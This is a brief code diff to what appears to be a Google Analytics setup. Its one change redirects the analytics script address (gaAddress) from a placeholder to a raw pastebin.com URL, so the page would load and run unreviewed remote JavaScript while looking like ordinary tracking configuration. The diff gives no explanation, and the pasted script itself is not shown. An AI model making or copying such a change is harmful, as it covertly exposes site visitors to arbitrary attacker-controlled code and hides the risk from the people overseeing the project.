@@ -7,7 +7,7 @@ if (GOOGLE_ANALYTICS_TRACKING_ID) {
     gaOptions: {
       siteSpeedSampleRate: 100,
     },
-    gaAddress: "https://example.com/ga.js",
+    gaAddress: "https://pastebin.com/raw/7Spbcpuw",
     debug: true,
     testMode: true,
   })
